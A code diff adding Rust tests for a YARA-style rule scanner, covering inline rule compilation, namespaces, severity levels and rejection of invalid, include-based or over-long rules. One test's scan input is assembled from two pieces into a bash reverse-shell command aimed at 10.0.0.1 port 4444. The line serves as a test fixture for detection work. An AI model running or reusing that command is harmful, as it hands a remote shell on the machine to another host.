@@ -166,3 +166,34 @@ fn rules_read_the_name_path_and_extension_of_what_they_scan() {
     assert_eq!(matched(&rules, b""), ["named"]);
     assert!(rules.scan(b"", Subject { path: "/tmp/other.txt", memory: false }).matches.is_empty());
 }
+
+#[test]
+fn rule_text_compiled_on_its_own_runs_without_borgs_rules_and_reads_the_same_variables() {
+    let rules = Rules::inline(
+        r#"rule marker { meta: severity = "notice" strings: $a = "borg-marker" condition: $a and extension == "sh" }"#,
+    )
+    .expect("compiles");
+    assert_eq!((rules.count(), rules.problems()), (1, &[][..]));
+    let bytes = [&b"bash -i >& /dev"[..], b"/tcp/10.0.0.1/4444 borg-marker"].concat();
+    let [found] = &rules.scan(&bytes, FILE).matches[..] else { panic!("only the inline rule runs") };
+    assert_eq!((found.namespace.as_str(), found.level, found.built_in()), (INLINE, Level::Notice, false));
+    assert!(rules.scan(b"borg-marker", Subject { path: "/tmp/notes.txt", memory: false }).matches.is_empty());
+}
+
+#[test]
+fn rule_text_that_does_not_compile_says_where_and_cannot_include_or_run_long() {
+    let Err(InlineError::Invalid(message)) =
+        Rules::inline("rule fine { condition: true }\nrule bad { condition: nothing }")
+    else {
+        panic!("an unknown identifier does not compile")
+    };
+    assert!(message.starts_with("inline:2:"), "{message}");
+    assert!(message.contains("nothing"), "{message}");
+    let folder = tempfile::tempdir().expect("folder");
+    let rule = folder.path().join("marker.yar");
+    fs::write(&rule, "rule marker { condition: true }").expect("rule");
+    let include = format!("include \"{}\"", rule.display());
+    assert!(matches!(Rules::inline(&include), Err(InlineError::Invalid(_))));
+    let long = format!("rule long {{ condition: true }}{}", " ".repeat(INLINE_LIMIT));
+    assert_eq!(Rules::inline(&long).err(), Some(InlineError::TooLong));
+}
